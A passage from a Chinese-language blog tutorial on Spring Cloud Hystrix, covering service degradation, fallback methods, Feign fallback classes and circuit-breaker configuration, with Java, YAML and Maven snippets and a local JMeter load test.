class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--jdbc--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-provider-hystrix-payment</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentService</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 正常访问</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_OK</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;线程池: &quot;</span>+Thread.currentThread().getName()+<span class="string">&quot; payment_OK,id &quot;</span>+id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfoTimeOut</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;线程池: &quot;</span>+Thread.currentThread().getName()+</span><br><span class="line">                <span class="string">&quot; paymentInfo_TimeOut,id &quot;</span>+id+<span class="string">&quot;耗时3秒钟&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> PaymentService paymentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String serverPort;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/payment/hystrix/ok/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_OK</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">        String result = paymentService.paymentInfo_OK(id);</span><br><span class="line">        log.info(<span class="string">&quot;****result&quot;</span>+result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/payment/hystrix/timeout/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">        String result = paymentService.paymentInfoTimeOut(id);</span><br><span class="line">        log.info(<span class="string">&quot;****result&quot;</span>+result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上module均ok，从正确-&gt;错误-&gt;降级熔断-&gt;恢复</p>
<h2 id="高并发测试"><a href="#高并发测试" class="headerlink" title="高并发测试"></a>高并发测试</h2><p>使用 Jmeter高并发压力测试，开启Jmeter，来20000并发量访问<code>payment_TimeOut</code></p>
<p>再来一个访问`<a href="http://localhost:8001/payment/hystrix/ok/1">http://localhost:8001/payment/hystrix/ok/1</a></p>
<p>结果：俩个都在加载中，tomcat默认工作线程被打满，</p>
<p><img src="https://csn.damyoung.cn/image-20210130202002902.png" alt="image-20210130202002902"></p>
<p><img src="https://csn.damyoung.cn/image-20210130202027028.png" alt="image-20210130202027028"></p>
<p><img src="https://csn.damyoung.cn/image-20210130202410989.png" alt="image-20210130202410989"></p>
<h2 id="增加消费服务"><a href="#增加消费服务" class="headerlink" title="增加消费服务"></a>增加消费服务</h2><p>cloud-consumer-feign-hystrix-order80</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--openfeign--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--hystrix--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--eureka client--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">ribbon:</span></span><br><span class="line">  <span class="attr">ReadTimeout:</span> <span class="number">5000</span></span><br><span class="line">  <span class="attr">ConnectTimeout:</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderHystrixMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderHystrixMain80.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient(value = &quot;CLOUD-PROVIDER-HYSTRIX-PAYMENT&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PaymentService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/payment/hystrix/ok/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_OK</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/payment/hystrix/timeout/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderHystrixController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> PaymentService paymentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/consumer/payment/hystrix/ok/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_OK</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">        String result = paymentService.paymentInfo_OK(id);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/consumer/payment/hystrix/timeout/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">        String result = paymentService.paymentInfo_TimeOut(id);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>使用Jmeter高并发测试，同上</p>
<p>结果：8001同一层次的其他接口服务被困死，因为tomcat线程池里面的工作线程已经被挤占完毕</p>
<p>​            80此时调用8001，客户端访问响应缓慢，转圈圈</p>
<p><strong>正因为有上述故障或不佳表现，才有我们降级/容错/限流等技术诞生</strong></p>
<p><strong>超时：</strong>导致服务器变慢(转圈)，超时不再等待</p>
<p><strong>出错：</strong>宕机或程序运行出错，出错要有兜底</p>
<p><strong>解决：</strong>对方服务(8001)超时，调用者(80)不能一直卡死等待，必须要有服务降级</p>
<p>​            对方服务(8001)down机，调用者(80)不能一直卡死等待，必须要有服务降级</p>
<p>​            对方服务(8001)OK，调用者(80)自己出故障或由自我要求(自己等待时间小于服务提供者)，自己处理降级</p>
<h2 id="服务降级-1"><a href="#服务降级-1" class="headerlink" title="服务降级"></a>服务降级</h2><h3 id="8001"><a href="#8001" class="headerlink" title="8001"></a>8001</h3><p>设置自身调用超时时间的峰值，峰值内可以正常运行，超过需要有兜底的方法处理，作服务降级fallback </p>
<p><code>@HystrixCommand</code>一旦调用服务方法失败并抛出错误信息后，会自动调用<code>@HystrixCommand</code>标注好的fallbackMethod调用类中的指定方法</p>
<p>cloud-provider-hystrix-payment8001</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HystrixCommand(fallbackMethod = &quot;paymentInfo_TimeoutHandler&quot;,commandProperties = &#123;</span></span><br><span class="line"><span class="meta">    //3000ms为峰值,超出则调用兜底方法</span></span><br><span class="line"><span class="meta">    @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;,value = &quot;3000&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">paymentInfoTimeOut</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;线程池: &quot;</span>+Thread.currentThread().getName()+</span><br><span class="line">        <span class="string">&quot; paymentInfo_TimeOut,id &quot;</span>+id+<span class="string">&quot;耗时3秒钟&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeoutHandler</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;线程池: &quot;</span>+Thread.currentThread().getName()+</span><br><span class="line">        <span class="string">&quot; paymentInfo_TimeoutHandler,id &quot;</span>+id+<span class="string">&quot;O(∩_∩)O哈哈~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@EnableCircuitBreaker</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentHystrixMain8001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(PaymentHystrixMain8001.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>超时时间超过峰值时间3秒，到达兜底方法</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20210130221930193.png" alt="image-20210130221930193"></p>
<ul>
<li>制造异常  <code>int a=10/0</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HystrixCommand(fallbackMethod = &quot;paymentInfo_TimeoutHandler&quot;,commandProperties = &#123;</span></span><br><span class="line"><span class="meta">           //3000ms为峰值,超出则调用兜底方法</span></span><br><span class="line"><span class="meta">            @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;,value = &quot;3000&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfoTimeOut</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> age=<span class="number">10</span>/<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;线程池: &quot;</span>+Thread.currentThread().getName()+</span><br><span class="line">                <span class="string">&quot; paymentInfo_TimeOut,id &quot;</span>+id+<span class="string">&quot;耗时3秒钟&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeoutHandler</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;线程池: &quot;</span>+Thread.currentThread().getName()+</span><br><span class="line">                <span class="string">&quot; 系统繁忙,请稍后再试,id &quot;</span>+id+<span class="string">&quot;O(∩_∩)O哈哈~&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210130222508860.png" alt="image-20210130222508860"></p>
<p><strong>结论：</strong>当前服务不可用，做服务降级，兜底方案都是<code>paymentInfo_TimeOutHandler</code></p>
<h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="meta">@EnableHystrix</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderHystrixMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderHystrixMain80.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/consumer/payment/hystrix/timeout/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="meta">@HystrixCommand(fallbackMethod = &quot;paymentTimeOutFallbackMethod&quot;,commandProperties = &#123;</span></span><br><span class="line"><span class="meta">        @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;,value = &quot;1500&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">    String result = paymentService.paymentInfo_TimeOut(id);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">paymentTimeOutFallbackMethod</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;我是消费者80,对方支付系统繁忙请10秒后再试,┭┮﹏┭┮&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><ol>
<li>每个业务方法对应一个兜底方法，代码冗杂</li>
</ol>
<p><strong>解决：</strong>global fallback</p>
<p><code>@DefaultProperties(defaultFallback=&quot; &quot;)</code>通用和独享的各自分开，避免了代码膨胀，合理减少了代码量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="meta">@DefaultProperties(defaultFallback = &quot;payment_Global_FallbackMethod&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderHystrixController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> PaymentService paymentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/consumer/payment/hystrix/timeout/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@HystrixCommand</span> <span class="comment">//3</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">        String result = paymentService.paymentInfo_TimeOut(id);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//2</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 下面是global fallback</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">payment_Global_FallbackMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;global异常处理信息，请稍后重试&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>代码耦合度高</li>
</ol>
<p>未来遇到的异常:运行、超时、宕机</p>
<p>修改cloud-consumer-feign-hystrix-order80</p>
<p>根据cloud-consumer-feign-hystrix-order80已经有的PaymentHystrixService接口，重新新建一个类(PaymentFallBackService)实现该接口，统一为接口里面的方法进行异常处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient(value = &quot;CLOUD-PROVIDER-HYSTRIX-PAYMENT&quot;,fallback = PaymentFallbackService.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PaymentService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/payment/hystrix/ok/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_OK</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/payment/hystrix/timeout/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentFallbackService</span> <span class="keyword">implements</span> <span class="title">PaymentService</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_OK</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;---fallback,ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;---fallback,timeout&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p><strong>测试</strong></p>
<p><img src="https://csn.damyoung.cn/image-20210130230131490.png" alt="image-20210130230131490"></p>
<ul>
<li>关闭payment8001,默认服务端宕机，但是我们做了服务降级处理，让客户端在服务端不可用时也会获得提示信息而不会挂起耗死服务器</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20210130230205943.png" alt="image-20210130230205943"></p>
<h2 id="服务熔断-1"><a href="#服务熔断-1" class="headerlink" title="服务熔断"></a>服务熔断</h2><p>熔断机制就是应对雪崩效应的一种微服务链路保护机制，当扇出链路的某个微服务出错不可用或者响应时间太长时，会进行服务的降级，进而熔断该节点微服务的调用，快速返回错误的响应信息</p>
<p>当检测到该节点微服务调用响应正常后，恢复调用链路</p>
<p>在SpringCloud框架中，熔断机制通过Hystrix实现，Hystrix会监控微服务间调用的状况，当失败的调用到一定阈值，缺省是5秒内20次调用失败，就会启动熔断机制，熔断机制的注解是<code>@HystrixCommand</code></p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>修改cloud-provider-hystrix-payment8001</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HystrixCommand(fallbackMethod = &quot;paymentCircuitBreaker_fallback&quot;,commandProperties = &#123;</span></span><br><span class="line"><span class="meta">        //是否开启断路器</span></span><br><span class="line"><span class="meta">        @HystrixProperty(name = &quot;circuitBreaker.enabled&quot;,value = &quot;true&quot;),</span></span><br><span class="line"><span class="meta">        //请求次数</span></span><br><span class="line"><span class="meta">        @HystrixProperty(name = &quot;circuitBreaker.requestVolumeThreshold&quot;,value = &quot;10&quot;),</span></span><br><span class="line"><span class="meta">        //时间窗口数</span></span><br><span class="line"><span class="meta">        @HystrixProperty(name = &quot;circuitBreaker.sleepWindowInMilliseconds&quot;,value = &quot;10000&quot;),</span></span><br><span class="line"><span class="meta">        //失败率达到多少后跳闸    </span></span><br><span class="line"><span class="meta">        @HystrixProperty(name = &quot;circuitBreaker.errorThresholdPercentage&quot;,value = &quot;60&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">paymentCircuitBreaker</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (id&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;**id 不能为负数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//==UUID.randomUUID()</span></span><br><span class="line">    String serialNumber = IdUtil.simpleUUID();</span><br><span class="line">    <span class="keyword">return</span> Thread.currentThread().getName()+<span class="string">&quot;\t调用成功,流水号&quot;</span>+serialNumber;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">paymentCircuitBreaker_fallback</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;id  不能为负数,请稍后再试 id  &quot;</span>+id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//服务熔断</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/payment/circuit/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">paymentCircuitBreaker</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">    String result = paymentService.paymentCircuitBreaker(id);</span><br><span class="line">    log.info(<span class="string">&quot;**result&quot;</span>+result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131105838125.png" alt="image-20210131105838125"></p>
<p><img src="https://csn.damyoung.cn/image-20210131105849878.png" alt="image-20210131105849878"></p>
<p><img src="https://csn.damyoung.cn/image-20210131110123521.png" alt="image-20210131110123521"></p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>熔断打开：请求不再进行调用当前服务，内部设置时钟一般为MTTR(平均故障处理时间)，当打开时长达到所设时钟则进入半熔断状态</p>
<p>熔断关闭：熔断关闭不会对服务进行熔断</p>
<p>熔断半开：部分请求更具规则调用当前服务，如果请求成功且符合规则则认为当前服务恢复正常，关闭熔断</p>
<p><img src="https://csn.damyoung.cn/image-20210131155127250.png" alt="image-20210131155127250"></p>
<p>断路器开启或者关闭的条件</p>
<p><img src="https://csn.damyoung.cn/image-20210131155150279.png" alt="image-20210131155150279"></p>
<p>断路器开启之后</p>
<p><img src="https://csn.damyoung.cn/image-20210131155323521.png" alt="image-20210131155323521"></p>
<p>ALL配置</p>
<h2 id="服务监控hystrixDashboard"><a href="#服务监控hystrixDashboard" class="headerlink" title="服务监控hystrixDashboard"></a>服务监控hystrixDashboard</h2><p><img src="https://csn.damyoung.cn/image-20210131155607319.png" alt="image-20210131155607319"></p>
<p>新建cloud-consumer-hystrix-dashboard9001</p>
